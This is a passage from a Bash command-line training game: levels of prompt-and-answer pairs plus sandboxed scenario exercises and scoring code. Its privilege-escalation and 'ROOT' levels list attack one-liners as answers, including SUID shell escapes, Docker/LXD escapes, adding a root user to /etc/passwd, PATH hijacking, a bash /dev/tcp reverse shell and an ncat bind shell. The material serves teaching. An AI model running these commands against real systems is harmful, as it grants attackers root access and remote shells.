  questions+=("Extract strings minimum 10 chars in ${W}${bin}${C}|strings -n 10 ${bin}")
  questions+=("Extract Unicode strings (Windows binaries) in ${W}${bin}${C}|strings -e l ${bin}")
  questions+=("Find URLs in ${W}${bin}${C}§strings ${bin} | grep -E 'https?://'")
  questions+=("Find email addresses in ${W}${bin}${C}§strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")

  # ELF analysis
  questions+=("Show ELF file header in ${W}${bin}${C}|readelf -h ${bin}")
  questions+=("Show ELF symbols in ${W}${bin}${C}|readelf -s ${bin}")
  questions+=("Show all ELF info in ${W}${bin}${C}|readelf -a ${bin}")
  questions+=("List shared library dependencies of ${W}${bin}${C}|ldd ${bin}")

  # Radare2
  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
  questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}")
  questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}")

  # Binwalk
  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")

  # Memory forensics (volatility3) - most common
  local -a _MEM_IMGS=(memory.dmp vmcore.dmp pagefile.sys)
  _fpick _MEM_IMGS; local memimg=$REPLY
  questions+=("List processes from memory dump|vol -f ${memimg} windows.pslist")
  questions+=("List network connections from memory|vol -f ${memimg} windows.netscan")
  questions+=("Show command lines of processes|vol -f ${memimg} windows.cmdline")
  questions+=("Scan for files in memory dump|vol -f ${memimg} windows.filescan")

  # File metadata
  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
  questions+=("Extract GPS coordinates from ${W}${photo}${C}|exiftool '-GPS*' ${photo}")
  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")

  # Disk imaging
  questions+=("Create disk image of /dev/sda to ${W}${img}${C}|dd if=/dev/sda of=${img} bs=4M status=progress")
  questions+=("Mount ${W}${img}${C} read-only|mount -o ro,loop ${img} /mnt/evidence")
  questions+=("Verify checksums file|sha256sum -c ${hash}")

  # File recovery / carving
  questions+=("Recover deleted files from ${img}|foremost -i ${img}")
  questions+=("Recover specific file types from ${W}${img}${C}|foremost -t jpg,pdf -i ${img}")
  questions+=("Foremost with custom output dir on ${W}${img}${C}|foremost -i ${img} -o ${dir}/")
  questions+=("List files in ${W}${img}${C} (TSK)|fls ${img}")
  questions+=("List files recursively in ${W}${img}${C}|fls -r ${img}")
  questions+=("List deleted files in ${W}${img}${C}|fls -d ${img}")
  questions+=("Create filesystem timeline|mactime -b ${dir}/bodyfile")
  questions+=("Create bodyfile from ${W}${img}${C}|fls -r -m / ${img} > ${dir}/bodyfile")

  printf '%s\n' "${questions[@]}"
}

# Level 29: Privilege Escalation
gen_level29() {
  eval "local questions=() $_QV"; _ctx

  # SUID/SGID enumeration
  questions+=("Find all SUID binaries|find / -perm -4000 -type f 2>/dev/null")
  questions+=("Find SUID or SGID binaries|find / -perm /6000 -type f 2>/dev/null")
  questions+=("Find files with capabilities|getcap -r / 2>/dev/null")

  # User enumeration
  questions+=("Show current user and groups|id")
  questions+=("Show sudoers rules|sudo -l")
  questions+=("Check sudo version (CVE check)|sudo --version")
  questions+=("Check if user in docker/lxd group§id | grep -E 'docker|lxd'")

  # System enumeration
  questions+=("Show OS and kernel version|uname -a")
  questions+=("Show running processes|ps aux")
  questions+=("Show network connections|ss -tlpn|netstat -tlpn")
  questions+=("Show cron jobs|cat /etc/crontab; crontab -l")
  questions+=("Show mounted filesystems|mount|df -h")

  # Config file hunting
  questions+=("Find config files with passwords|grep -ri 'password' /etc/ 2>/dev/null")
  questions+=("Check .bash_history|cat ~/.bash_history")
  questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null")

  # GTFOBins-style exploits (representative examples)
  questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
  questions+=("SUID vim shell escape|vim -c ':!/bin/sh -p'")
  questions+=("SUID python3 shell|python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
  questions+=("Sudo env privesc|sudo env /bin/sh")

  # Kernel exploits prep
  questions+=("Check kernel exploits (searchsploit)|searchsploit linux kernel \$(uname -r)")

  # Docker/LXD escape
  questions+=("Docker socket check|ls -la /var/run/docker.sock")
  questions+=("Docker escape via socket|docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
  questions+=("LXD privilege escalation|lxc init ubuntu:22.04 privesc -c security.privileged=true")

  # Weak permissions
  questions+=("Check /etc/passwd writeable|ls -la /etc/passwd")
  questions+=("Check /etc/shadow readable|ls -la /etc/shadow")
  questions+=("Privesc: add root user to /etc/passwd (when writable)|echo \"hacker:\$(openssl passwd -6 pass):0:0::/root:/bin/bash\" >> /etc/passwd")
  questions+=("Check writable /etc/sudoers|ls -la /etc/sudoers")

  # Path hijacking
  questions+=("Check current PATH|echo \$PATH")
  questions+=("Prepend current dir to PATH|export PATH=.:\$PATH")
  questions+=("Create malicious binary|echo '#!/bin/bash' > /tmp/ls && echo '/bin/bash -p' >> /tmp/ls && chmod +x /tmp/ls")
  questions+=("Exploit relative path in SUID|export PATH=/tmp:\$PATH && ./vulnerable_suid")

  # NFS
  questions+=("Check NFS exports|showmount -e ${ip}|cat /etc/exports")
  questions+=("Mount NFS share from ${ip}|mount -t nfs ${ip}:/share /mnt")
  questions+=("Create SUID on NFS|cp /bin/bash /mnt && chmod +s /mnt/bash")

  printf '%s\n' "${questions[@]}"
}

# Level 30: ROOT
gen_level30() {
  eval "local questions=() $_QV"; _ctx

  # === EMERGENCY RECOVERY ===
  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
  questions+=("Emergency single-user mode|init 1|systemctl rescue")
  questions+=("Chroot into system mounted at /mnt|chroot /mnt /bin/bash")
  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
  questions+=("Fix broken sudo (as root)|chown root:root /usr/bin/sudo; chmod 4755 /usr/bin/sudo")
  questions+=("Reset root password from recovery|passwd root")
  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")

  # === HARDCORE ONE-LINERS ===
  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
  questions+=("Emergency disk space cleanup|find /var/log -name '*.gz' -mtime +7 -delete")
  questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null")
  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")

  # === NETWORK SURVIVAL ===
  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
  questions+=("Bind shell with ncat|ncat -lvnp ${port} -e /bin/bash")
  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")

  # === SYSTEM FORENSICS ===
  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
  questions+=("List all users with shell access§grep -vE 'nologin|false' /etc/passwd")
  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -iE 'failed|invalid'§grep 'Failed' /var/log/auth.log")
  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
  questions+=("Dump all environment variables§env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$4}' | sed 's/.*://' | xargs -I{} lsof -i:{}")
  questions+=("Find processes with deleted binaries§ls -la /proc/*/exe 2>/dev/null | grep deleted")
  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")

  # === DEFENSIVE HARDENING ===
  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP")
  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
  questions+=("Flush all firewall rules|iptables -F; iptables -X")
  questions+=("List all iptables rules|iptables -L -n -v")
  questions+=("List all nftables rules|nft list ruleset")
  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")

  # === PROCESS NINJA ===
  questions+=("Watch memory hogs in realtime§watch -n1 'ps aux --sort=-%mem | head -5'")
  questions+=("Find process using open file ${W}${txt}${C}§lsof ${txt}§fuser ${txt}")
  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
  questions+=("Kill all processes by name|pkill -9 -f pattern")
  questions+=("Nice a running process|renice -n 10 -p PID")

  # === DISK SURVIVAL ===
  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
  questions+=("Secure wipe ${W}${txt}${C}|shred -vfz -n 3 ${txt}")
  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")

  # === PURE BASH MAGIC ===
  questions+=("Random string generator§tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
  questions+=("Timestamp in epoch|date +%s")
  questions+=("Convert epoch to date|date -d @1234567890")
  questions+=("Parallel execution with xargs§cat urls.txt | xargs -P 10 -I{} curl -s {}")
  questions+=("Timeout a command|timeout 5 long_running_cmd")
  questions+=("Retry command until success|until cmd; do sleep 1; done")
  questions+=("Lock file to prevent concurrent runs§exec 200>/tmp/lock; flock -n 200 || exit 1")
  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")

  # === OFFLINE/AIR-GAPPED ===
  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
  questions+=("Encrypt ${W}${txt}${C} for offline transport|gpg -c --cipher-algo AES256 ${txt}")

  printf '%s\n' "${questions[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# SCENARIO SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════

_sc_is_done() { [[ ",$SC_DONE," == *",$1,"* ]]; }
_sc_mark_done() {
  _sc_is_done "$1" && return
  [[ -n "$SC_DONE" ]] && SC_DONE="$SC_DONE,$1" || SC_DONE="$1"
  _save_profile
}

# --- Scenario 1: The Broken Deploy ---
_sc_setup_1() {
  local d=$1
  chmod 644 "$d/deploy.sh"
  rm -f "$d/VERSION"
  printf '[server]\nhost=localhost\nport=0\n' > "$d/config.ini"
}
_sc_steps_1() {
  cat <<'STEPS'
Check permissions on deploy.sh§ls -l deploy.sh§ls -la deploy.sh#output:~-rw-r--r--
Make deploy.sh executable§chmod +x deploy.sh§chmod 755 deploy.sh§chmod u+x deploy.sh#state:perm:deploy.sh:x
Create VERSION file with "1.0"§echo 1.0 > VERSION§printf '1.0\n' > VERSION#state:contains:VERSION:1.0,lines:VERSION:1
Fix the port in config.ini to 8080§sed -i 's/port=0/port=8080/' config.ini§sed -i 's/port=0/port=8080/g' config.ini#state:contains:config.ini:port=8080
Run the deploy script§./deploy.sh§bash deploy.sh#output:~Deploy complete
STEPS
}

# --- Scenario 2: Log Emergency ---
_sc_setup_2() {
  local d=$1
  cat > "$d/app.log" <<'LOG'
2024-01-15 08:00:01 INFO Application started
2024-01-15 08:01:12 ERROR Connection refused to database
2024-01-15 08:01:15 ERROR Connection refused to database
2024-01-15 08:02:30 WARN Disk usage at 85%
2024-01-15 08:03:01 INFO Health check passed
2024-01-15 08:03:45 ERROR Connection refused to database
2024-01-15 08:04:10 ERROR Database error: timeout
2024-01-15 08:04:30 WARN Memory usage high
2024-01-15 08:05:00 INFO Retry succeeded
2024-01-15 08:05:30 ERROR Connection refused to database
LOG
}
_sc_steps_2() {
  cat <<'STEPS'
Count the ERROR lines in app.log§grep -c ERROR app.log#output:5
Find the most common error message§grep ERROR app.log | sed 's/.* ERROR //' | sort | uniq -c | sort -rn | head -1§grep ERROR app.log | cut -d' ' -f4- | sort | uniq -c | sort -rn | head -1#output:~Connection refused
Save all ERROR lines to errors.txt§grep ERROR app.log > errors.txt#state:contains:errors.txt:ERROR,lines:errors.txt:5
Count unique error types§grep ERROR app.log | sed 's/.* ERROR //' | sort -u | wc -l§grep ERROR app.log | cut -d' ' -f4- | sort -u | wc -l#output:2
Remove all ERROR lines from app.log§sed -i '/ERROR/d' app.log§grep -v ERROR app.log > tmp && mv tmp app.log#state:lines:app.log:5
STEPS
}

# --- Scenario 3: Messy CSV ---
_sc_setup_3() {
  local d=$1
  cat > "$d/data.csv" <<'CSV'
id,name,status
3,charlie,active
1,alice,active
2,bob,inactive
1,alice,active
4,dave,active
2,bob,inactive
CSV
}
_sc_steps_3() {
  cat <<'STEPS'
Count data rows (excluding header)§tail -n +2 data.csv | wc -l§sed 1d data.csv | wc -l#output:~^\s*6\s*$
Find duplicate lines (excluding header)§tail -n +2 data.csv | sort | uniq -d#output:~alice
Sort and deduplicate (keep header)§head -1 data.csv > sorted.csv && tail -n +2 data.csv | sort -t, -k1 -n | uniq >> sorted.csv§(head -1 data.csv; tail -n +2 data.csv | sort -t, -k1,1n | uniq) > sorted.csv#state:lines:sorted.csv:5,contains:sorted.csv:id,name,status
Count active entries in sorted file§grep -cw active sorted.csv§grep -c ',active$' sorted.csv#output:3
STEPS
}

# --- Scenario 4: Permission Lockout ---
_sc_setup_4() {
  local d=$1
  chmod 000 "$d/config.ini"
  chmod 644 "$d/backup.sh"
  mkdir -p "$d/logs"
  chmod 000 "$d/logs"
}
_sc_steps_4() {
  cat <<'STEPS'
Make config.ini readable§chmod 644 config.ini§chmod a+r config.ini§chmod u+r config.ini#state:perm:config.ini:r
Make backup.sh executable§chmod +x backup.sh§chmod 755 backup.sh§chmod u+x backup.sh#state:perm:backup.sh:x
Make logs/ directory accessible§chmod 755 logs§chmod +rx logs§chmod a+rx logs#state:perm:logs:rx
Run backup.sh to verify it works§./backup.sh§bash backup.sh#output:~Backup complete
STEPS
}

# --- Scenario 5: Find the Needle ---
_sc_setup_5() {
  local d=$1
  # Clear pre-existing TODOs from notes.txt
  printf 'Meeting Notes\n=============\nNo action items.\n' > "$d/notes.txt"
  # Plant markers across the codebase
  mkdir -p "$d/src/lib"
  cat > "$d/main.py" <<'PY'
#!/usr/bin/env python3
"""Main application module."""

def main():
    pass  # TODO: implement main logic

if __name__ == "__main__":
    main()
PY
  printf '# FIXME: broken on edge case\ndef helper(x):\n    return x * 2\n' > "$d/src/lib/helpers.py"
  printf '# HACK: temporary workaround\necho "ok"\n' >> "$d/deploy.sh"
  printf '# TODO: add error handling\n' >> "$d/backup.sh"
}
_sc_steps_5() {
  cat <<'STEPS'
Find files containing TODO§grep -rl TODO .§grep -rl TODO#output:~main\.py
Count total TODO/FIXME/HACK markers§grep -rE 'TODO|FIXME|HACK' . | wc -l§grep -r 'TODO\|FIXME\|HACK' . | wc -l#output:4
Show markers with line numbers§grep -rnE 'TODO|FIXME|HACK' .§grep -rn 'TODO\|FIXME\|HACK' .#output:~TODO
Find the file with FIXME§grep -rl FIXME .§grep -rl FIXME#output:~helpers\.py
STEPS
}

# --- Scenario 6: Archive & Extract ---
_sc_setup_6() {
  local d=$1
  mkdir -p "$d/release"
  printf '2.0\n' > "$d/release/VERSION"
  printf '# Release Notes\nNew features.\n' > "$d/release/README.md"
  printf 'print("hello")\n' > "$d/release/app.py"
}
_sc_steps_6() {
  cat <<'STEPS'
Create a tar.gz of the release/ directory§tar czf release.tar.gz release§tar -czf release.tar.gz release#state:exists:release.tar.gz
List the archive contents§tar tzf release.tar.gz§tar -tzf release.tar.gz§tar -tf release.tar.gz#output:~release/
Delete the original release/ directory§rm -rf release§rm -r release#state:!exists:release
Extract the archive to restore it§tar xzf release.tar.gz§tar -xzf release.tar.gz§tar xf release.tar.gz#state:exists:release/VERSION
STEPS
}

# --- Scenario 7: The Incident ---
_sc_setup_7() {
  local d=$1
  cat > "$d/server.log" <<'LOG'
2024-01-15 08:00:01 192.168.1.100 GET /index.html 200
2024-01-15 08:01:10 10.10.10.50 POST /login 401
2024-01-15 08:01:15 10.10.10.50 POST /login 401
2024-01-15 08:01:20 10.10.10.50 POST /login 401
2024-01-15 08:01:25 10.10.10.50 POST /login 200
2024-01-15 08:02:00 192.168.1.100 GET /dashboard 200
2024-01-15 08:02:30 10.10.10.50 GET /admin 200
2024-01-15 08:03:00 192.168.1.100 GET /api/status 200
2024-01-15 08:04:00 10.10.10.50 GET /admin/users 200
2024-01-15 08:05:00 192.168.1.100 GET /index.html 200
LOG
}
_sc_steps_7() {
  cat <<'STEPS'
Find the IP with the most requests§awk '{print $3}' server.log | sort | uniq -c | sort -rn | head -1§cut -d' ' -f3 server.log | sort | uniq -c | sort -rn | head -1#output:~10\.10\.10\.50
Count failed login attempts (401)§grep 401 server.log | wc -l§grep -c 401 server.log#output:3
Check if the attacker got in (find 200 after 401s from same IP)§grep 10.10.10.50 server.log | grep 200§grep '10.10.10.50.*200' server.log#output:~login 200
Save all attacker activity to attacker.log§grep 10.10.10.50 server.log > attacker.log#state:contains:attacker.log:10.10.10.50,lines:attacker.log:6
Count unique IPs in the log§awk '{print $3}' server.log | sort -u | wc -l§awk '{print $3}' server.log | sort | uniq | wc -l#output:2
STEPS
}

# --- Scenario 8: Config Surgery ---
_sc_setup_8() {
  local d=$1
  cat > "$d/config.ini" <<'CFG'
[general]
app_name=myapp
debug=true
version=2.1

[database]
host=localhost
port=5432
password=hunter2

[logging]
level=DEBUG
file=/var/log/app.log
rotate=daily
CFG
}
_sc_steps_8() {
  cat <<'STEPS'
Find the debug setting§grep debug config.ini§grep -i debug config.ini#output:debug=true
Disable debug mode (set to false)§sed -i 's/debug=true/debug=false/' config.ini#state:contains:config.ini:debug=false
Find the plaintext password§grep password config.ini§grep -i password config.ini#output:password=hunter2
Remove the password line§sed -i '/password/d' config.ini§sed -i '/^password/d' config.ini#state:!contains:config.ini:password
Fix log level to INFO§sed -i 's/level=DEBUG/level=INFO/' config.ini§sed -i 's/DEBUG/INFO/' config.ini#state:contains:config.ini:level=INFO
STEPS
}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION SYSTEM - Generate and manage questions per level
# ═══════════════════════════════════════════════════════════════════════════════

# Question cache - avoids O(n²) regeneration for review questions
declare -A _LEVEL_CACHE=()

# Get questions for a level (cached)
_get_level_questions() {
  local lv=$1
  if [[ -z "${_LEVEL_CACHE[$lv]:-}" ]]; then
    _LEVEL_CACHE[$lv]=$(gen_level${lv})
  fi
  printf '%s' "${_LEVEL_CACHE[$lv]}"
}

# Generate questions for a level (called once per level attempt)
declare -a CURRENT_QUESTIONS=()
generate_level() {
  local level=$1
  CURRENT_QUESTIONS=()

  # Main level questions (always fresh for variety)
  local raw
  raw=$(gen_level${level})
  _LEVEL_CACHE[$level]="$raw"  # Cache for potential future use
  while IFS= read -r line; do
    [[ -n "$line" ]] && CURRENT_QUESTIONS+=("$line")
  done <<< "$raw"

  # Review: add questions from previous levels (O(n) with cache)
  if ((level > 1)); then
    local review=() prev_arr=()
    for ((prev=1; prev<level; prev++)); do
      prev_arr=()
      while IFS= read -r line; do
        [[ -n "$line" ]] && prev_arr+=("$line")
      done <<< "$(_get_level_questions "$prev")"
      # Pick random questions from this previous level
      if ((${#prev_arr[@]} > 0)); then
        _fshuffle_n prev_arr $REVIEW_PER_LEVEL
        review+=("${prev_arr[@]}")
      fi
    done
    CURRENT_QUESTIONS+=("${review[@]}")
  fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# CORE ENGINE (mostly unchanged from original)
# ═══════════════════════════════════════════════════════════════════════════════

# Normalize flags: -la == -al == -a -l (REPLY pattern, no fork)
_fnorm() {
  [[ -z "$1" ]] && { REPLY=""; return; }
  local parts flags=() args=() p
  read -ra parts <<< "$1"; REPLY="${parts[0]}"
  for p in "${parts[@]:1}"; do
    if [[ "$p" == -* ]]; then
      [[ "$p" =~ ^-[a-zA-Z]+$ && ${#p} -gt 2 ]] && { for ((j=1;j<${#p};j++)); do flags+=("-${p:j:1}"); done; } || flags+=("$p")
    else args+=("$p"); fi
  done
  local i j tmp
  for ((i=1; i<${#flags[@]}; i++)); do
    tmp="${flags[$i]}"
    for ((j=i; j>0; j--)); do [[ "${flags[$((j-1))]}" > "$tmp" ]] || break; flags[$j]="${flags[$((j-1))]}"; done
    flags[$j]="$tmp"
  done
  ((${#flags[@]})) && { for p in "${flags[@]}"; do REPLY+=" $p"; done; }
  ((${#args[@]})) && { for p in "${args[@]}"; do REPLY+=" $p"; done; }
}

_SANDBOX_OUTPUT=""  # Store output for display after check
check() {
  local inp="${1#"${1%%[![:space:]]*}"}" a b ninp; inp="${inp%"${inp##*[![:space:]]}"}"; _fnorm "$inp"; ninp=$REPLY
  _SANDBOX_OUTPUT=""

  # Sandbox mode: execute command and validate output/state
  if ((SANDBOX_MODE && !_qtext)); then
    local output _sb_err _sb_rc
    { output=$(_sandbox_exec "$inp" 5 2>"$SANDBOX_DIR/.stderr"); } 2>/dev/null; _sb_rc=$?
    _sb_err=$(<"$SANDBOX_DIR/.stderr" 2>/dev/null) || _sb_err=""
    _SANDBOX_OUTPUT="${output}${_sb_err:+$'\n'$_sb_err}"

    # Track destructive commands for reset
    _is_destructive "$inp" && _SANDBOX_DESTRUCTIVE=1

    # Reject command-not-found (127) and cannot-execute (126) errors
    if ((_sb_rc != 127 && _sb_rc != 126)); then
      # Validate based on markers
      if [[ -n "$_qoutput" ]]; then
        _sandbox_check_output "$output" "$_qoutput" && return 0
      fi
      if [[ -n "$_qstate" ]]; then
        _sandbox_check_state "$_qstate" && return 0
      fi
    fi

    # Fall through to text matching if no markers or sandbox failed
  fi

  # Text matching fallback (§ delimiter for questions with pipes, | for legacy)
  local delim="$_qdelim"
  local -a opts; IFS="$delim" read -ra opts <<< "$2"
  for a in "${opts[@]}"; do
    b="${a#"${a%%[![:space:]]*}"}"; b="${b%"${b##*[![:space:]]}"}"
    [[ -z "$b" ]] && continue
    # ~pattern = regex match
    if [[ "$b" == ~* ]]; then
      local _pat="${b:1}"; [[ "$inp" =~ ${_pat} ]] && return 0
    else
      _fnorm "$b"; [[ "$inp" == "$b" || "$ninp" == "$REPLY" ]] && return 0
    fi
  done; return 1
}

LVL=1 QI=0 TOT=0
load() {
  [[ -f "$DATA/session.json" ]] && {
    local fd t; exec {fd}<"$DATA/session.json"; flock -s "$fd"
    t=$(<"$DATA/session.json")
    exec {fd}<&-
    LVL="${t#*\"level\":}"; LVL="${LVL%%[!0-9]*}"
    [[ "$t" == *'"qi":'* ]] && { QI="${t#*\"qi\":}"; QI="${QI%%[!0-9]*}"; }
  }
  LVL=${LVL:-1}; QI=${QI:-0}
  ((LVL < 1)) && LVL=1  # migrate old 0-indexed sessions
}
save() {
  local fd; exec {fd}>"$DATA/session.lock"; flock -x "$fd"
  printf '{"level":%d,"qi":%d}\n' "$LVL" "$QI" > "$DATA/session.json.tmp"
  mv "$DATA/session.json.tmp" "$DATA/session.json"
  exec {fd}>&-
}
# Score tracking: tier 0=unseen/demoted, 1=learning, 2=mastered (djb2 hash keys, no forks)
declare -A _HASH_CACHE=()
_hash() {
  local key="$1"
  if [[ -n "${_HASH_CACHE[$key]:-}" ]]; then REPLY="${_HASH_CACHE[$key]}"; return; fi
  local h=5381 i c
  for ((i=0; i<${#key}; i++)); do
    printf -v c '%d' "'${key:i:1}"
    h=$(( ((h << 5) + h + c) & 0xFFFFFFFF ))
  done
  printf -v REPLY '%08x' "$h"
  _HASH_CACHE[$key]="$REPLY"
}
# Flush scores atomically (pure bash, no sed fork)
_sflush() {
  local _fd; exec {_fd}>"$DATA/scores.lock"; flock -x "$_fd"
  { printf '#v1\n'; for k in "${!_sc[@]}"; do printf '%s|%s\n' "$k" "${_sc[$k]}"; done; } > "$DATA/scores.tmp"
  mv "$DATA/scores.tmp" "$DATA/scores"
  exec {_fd}>&-
}

# Populate lv_total/lv_mastered from a scores array (caller must declare them)
_calc_mastery() {
  local -n _src=$1; _cm_seen=0 _cm_t1=0 _cm_t2=0 _cm_tagged=0
  for k in "${!_src[@]}"; do
    local _val="${_src[$k]}" _tier _lvtag
    _tier="${_val%%|*}"
    [[ "$_val" == *"|"* ]] && { _lvtag="${_val#*|}"; _cm_tagged=1; } || _lvtag=""
    case "$_tier" in 0|1) ((_cm_t1++));; *) ((_cm_t2++));; esac
    ((_cm_seen++))
    [[ -n "$_lvtag" ]] && {
      lv_total[$_lvtag]=$(( ${lv_total[$_lvtag]:-0} + 1 ))
      [[ "$_tier" != "0" && "$_tier" != "1" ]] && lv_mastered[$_lvtag]=$(( ${lv_mastered[$_lvtag]:-0} + 1 ))
    }
  done
}

stats() {
  local -A sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do [[ "$k" == "#"* ]] && continue; sc[$k]=$v; done < "$DATA/scores"
  printf '%s\n' "${W}${B}${PLAYER_NAME:-anon}${N}"
  printf '%s\n\n' "${D}Stats show unique prompts seen${N}"
  local -A lv_total lv_mastered; _calc_mastery sc
  printf 'Total: %s  %s learning  %s mastered\n\n' "${B}${_cm_seen}${N}" "${Y}${_cm_t1}${N}" "${G}${_cm_t2}${N}"
  local BAR_W=10
  for lv in {1..30}; do
    local lt=${lv_total[$lv]:-0} lm=${lv_mastered[$lv]:-0}
    local boss_mark=""
    ((lv <= BOSS_BEATEN)) && boss_mark="${G}+${N}" || boss_mark="${D}·${N}"
    if ((lt > 0)); then
      local pct=$((lm * 100 / lt)) filled=$((lm * BAR_W / lt)); local empty=$((BAR_W - filled))
      local bar_f bar_e; printf -v bar_f '%*s' "$filled" ''; printf -v bar_e '%*s' "$empty" ''
      local col; ((pct >= 80)) && col=$G || { ((pct >= 40)) && col=$Y || col=$R; }
      printf "  %s ${W}%2d${N} %-22s ${col}%s${D}%s${N} %3d%% (%d/%d)\n" "$boss_mark" "$lv" "${LEVEL_NAMES[$lv]:-}" "${bar_f// /█}" "${bar_e// /░}" "$pct" "$lm" "$lt"
    else
      printf "  %s ${W}%2d${N} %-22s ${D}%*s${N}\n" "$boss_mark" "$lv" "${LEVEL_NAMES[$lv]:-}" "$BAR_W" "no data"
    fi
  done
  # Scenario progress
  local sc_count=0
  [[ -n "$SC_DONE" ]] && { IFS=',' read -ra _sca <<< "$SC_DONE"; sc_count=${#_sca[@]}; }
  ((SC_TOTAL > 0)) && printf '\n  %s %s/%d\n' "${D}Scenarios:${N}" "${W}${B}${sc_count}${N}" "$SC_TOTAL"
  # Easter eggs
  local egg_count=0
  [[ -n "$EGGS_FOUND" ]] && { IFS=',' read -ra _ea <<< "$EGGS_FOUND"; egg_count=${#_ea[@]}; }
  printf '  %s %s/%d\n' "${D}Easter Eggs:${N}" "${Y}${egg_count}${N}" "$_EGG_TOTAL"
}

# Session tracking
_S_ANSWERED=0 _S_CORRECT=0 _S_STREAK=0 _S_BEST_STREAK=0 _S_MASTERED=0 _S_START=0
_session_init() { printf -v _S_START '%(%s)T' -1; _S_ANSWERED=0 _S_CORRECT=0 _S_STREAK=0 _S_BEST_STREAK=0 _S_MASTERED=0; _egg_check nightowl; }
_quit() {
  _sflush_if_dirty
  printf '\n'
  if ((_S_ANSWERED > 0)); then
    local elapsed=$(( $(printf '%(%s)T' -1) - _S_START ))
    local m=$((elapsed / 60)) s=$((elapsed % 60))
    printf '%s\n%s\n  Answered:    %s\n' "${B}Session Summary${N}" "${D}----------------------------------------${N}" "${B}${_S_ANSWERED}${N}"
    printf '  Correct:     %s' "${G}${_S_CORRECT}${N}"
    ((_S_ANSWERED > 0)) && printf ' (%d%%)' $((_S_CORRECT * 100 / _S_ANSWERED))
    printf '\n  Best streak: %s\n' "${W}${B}${_S_BEST_STREAK}${N}"
    ((_S_MASTERED > 0)) && printf '  Mastered:    %s\n' "${G}${_S_MASTERED}${N}"
